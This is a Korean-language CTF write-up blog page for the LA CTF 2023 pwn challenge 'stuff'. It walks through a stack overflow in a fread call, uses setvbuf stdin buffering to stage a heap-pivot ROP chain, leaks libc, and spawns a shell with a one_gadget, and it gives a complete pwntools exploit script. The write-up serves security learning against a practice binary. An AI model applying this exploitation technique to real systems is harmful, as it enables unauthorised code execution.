@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1732   Jason keeps bullying me for using Fedora so here’s a binary compiled on Fedora.nc lac.tf 31182   [7 solves &#x2F; 497 points]  새로운 것을 많이 배운 문제이다. Analysis분석하기에 앞서 pat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="La CTF 2023 - stuff (setvbuf)">
+<meta property="og:url" content="https://jiravvit.github.io/230303-lactf2023-stuff/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1732   Jason keeps bullying me for using Fedora so here’s a binary compiled on Fedora.nc lac.tf 31182   [7 solves &#x2F; 497 points]  새로운 것을 많이 배운 문제이다. Analysis분석하기에 앞서 pat">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-02T23:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-05T14:38:27.865Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="setvbuf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>La CTF 2023 - stuff (setvbuf)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/230223-pwn-setvbuf/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230303-lactf2023-stuff/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230303-lactf2023-stuff/&text=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230303-lactf2023-stuff/&is_video=false&description=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=La CTF 2023 - stuff (setvbuf)&body=Check out this article: https://jiravvit.github.io/230303-lactf2023-stuff/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230303-lactf2023-stuff/&name=La CTF 2023 - stuff (setvbuf)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230303-lactf2023-stuff/&t=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        La CTF 2023 - stuff (setvbuf)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-02T23:00:00.000Z" itemprop="datePublished">2023-03-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/setvbuf/" rel="tag">setvbuf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li>
+</ul>
+<blockquote>
+<p>Jason keeps bullying me for using Fedora so here’s a binary compiled on Fedora.<br><code>nc lac.tf 31182</code></p>
+</blockquote>
+<ul>
+<li>[7 solves &#x2F; 497 points]</li>
+</ul>
+<p>새로운 것을 많이 배운 문제이다.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>분석하기에 앞서 <code>patchelf</code>를 이용하여 열심히 패치를 진행했다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch stuff]$ ldd stuff-p</span><br><span class="line">	linux-vdso.so.1 (0x00007ffdd2f16000)</span><br><span class="line">	./libstdc++.so.6 (0x00007f32ef600000)</span><br><span class="line">	./libm.so.6 (0x00007f32ef86a000)</span><br><span class="line">	./libgcc_s.so.1 (0x00007f32ef84a000)</span><br><span class="line">	./libc.so.6 (0x00007f32ef423000)</span><br><span class="line">	./ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f32ef94c000)</span><br></pre></td></tr></table></figure>
+
+<p>이제 IDA를 이용해서 코드를 분석해보자.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;menu:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1. leak&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2. do stuff&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6) != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;oops&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;here&#x27;s your leak: %p\n&quot;</span>, v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">2</span> );</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x20</span>uLL, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>두 가지의 기능이 있다. heap 주소를 출력해주는 기능과 <code>fread</code> 함수를 이용해서 <code>char ptr[12]</code>에 0x20만큼 쓸 수 있다. 여기에서 overflow를 발생시킬 수 있고 ret를 덮어 rip를 조절할 수 있다.</p>
+<p>여기서 중요한 점은 <code>setvbuf</code>를 이용하여 <code>stdin</code>을 사용할 때 버퍼링을 이용하기 때문에 힙에 내가 입력한 값들이 저장된다. 이것은 힙 주소에 페이로드를 저장시킬 수 있다는 것을 의미한다.</p>
+<ul>
+<li><a href="https://jiravvit.github.io/230223-pwn-setvbuf/">https://jiravvit.github.io/230223-pwn-setvbuf/</a></li>
+</ul>
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>scanf</code>로 숫자 데이터를 하나 보낼 때, 뒤에 다른 값들을 덧붙이면 이 데이터들은 힙 버퍼에 저장되고, 다음 입력 때 사용자의 키보드로부터 입력을 받지 않고 이 힙 버퍼에 저장된 값을 바로 입력으로 넣어줄 수 있다. </p>
+<ol>
+<li><p>주어진 기능을 이용해 힙 주소를 leak한다. </p>
+</li>
+<li><p>2번 기능을 이용하기 위해 2를 서버로 전송하는데, 뒤에 ROP 페이로드를 덧붙여서 한 번에 전송한다. 참고로 이 ROP 페이로드는 2번 기능의 <code>fread</code> 함수가 종료된 뒤, main이 끝나고 <code>leave ret</code>을 한 번 더 수행하여 rbp와 rsp를 heap주소로 만들어준다. 그 heap 주소는 ROP 페이로드가 저장된 곳이고 <code>fread</code> 가젯을 배치하여 바로 한 번 더 실행하게 한다. 이 때, 두 번째 페이로드를 입력으로 받는데, 이것의 역할은 <code>printf</code> 함수를 실행하도록 하는 것이다. <code>fread</code> 함수가 종료되고 <code>printf();</code>가 실행되는데 NULL pointer를 출력하게 되면 아무것도 출력하지 않는다. 중요한 것은 <code>printf</code> 함수가 종료되고 <code>rsi</code>에 <code>libc</code> 주소가 들어가는 것이다. 그 다음 <code>0x4011f6</code> 주소가 실행되는데 이는 <code>rsi</code> 레지스터를 출력하므로 최종적으로 <code>libc</code> 주소를 출력할 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011F6 mov     edi, offset format ; &quot;here&#x27;s your leak: %p\n&quot;</span><br><span class="line">.text:00000000004011FB mov     eax, 0</span><br><span class="line">.text:0000000000401200 call    _printf</span><br></pre></td></tr></table></figure>
+<p>이 작업이 끝나면 main의 <code>while(1)</code> 루프 내부이므로 main의 기능을 추가적으로 더 실행할 수 있다.</p>
+</li>
+<li><p>화면에 leak된 libc 주소를 가져와 libc base를 구한다.</p>
+</li>
+<li><p>원가젯을 이용하여 쉘을 획득한다. 2번 메뉴를 이용하여 rip를 조작할 수 있다. 조건은 아래와 같으므로 레지스터 상황을 살펴보고 적당한 가젯을 찾아 값을 바꿔준다. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x4d1a0 posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ) </span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stuff-p&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;lac.tf&#x27;, 31182)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./stuff-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401234</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) leak the heap</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;stuff\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.rjust(<span class="number">8</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># heap pivoting</span></span><br><span class="line"><span class="comment"># fread(ptr, 1uLL, 0x20uLL, stdin);</span></span><br><span class="line">payload += p64(heap)</span><br><span class="line">payload += p64(<span class="number">0x40120f</span>) <span class="comment"># fread gadget</span></span><br><span class="line">payload += p64(heap-<span class="number">0x1008</span>)</span><br><span class="line">payload += p64(leave_ret) <span class="comment"># 0x20</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;stuff\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># p.send(p64(heap-0x1008) * 2 + p64(e.plt[&#x27;printf&#x27;]) + p64(0x4011f6))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;printf&#x27;</span>]) <span class="comment"># fread -&gt; printf :: set rsi to libc</span></span><br><span class="line">payload += p64(<span class="number">0x4011f6</span>) <span class="comment"># print libc</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;leak: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line">libc.address = leak - <span class="number">0x1d5a40</span></span><br><span class="line">info(<span class="string">&#x27;libc.address: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (4)</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4d1a0</span></span><br><span class="line">pop_rbx = libc.address + <span class="number">0x0000000000031f61</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.rjust(<span class="number">8</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rbx) + p64(<span class="number">0</span>) + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;stuff\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230303-lactf2023-stuff/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230303-lactf2023-stuff/&text=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230303-lactf2023-stuff/&is_video=false&description=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=La CTF 2023 - stuff (setvbuf)&body=Check out this article: https://jiravvit.github.io/230303-lactf2023-stuff/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230303-lactf2023-stuff/&title=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230303-lactf2023-stuff/&name=La CTF 2023 - stuff (setvbuf)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230303-lactf2023-stuff/&t=La CTF 2023 - stuff (setvbuf)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
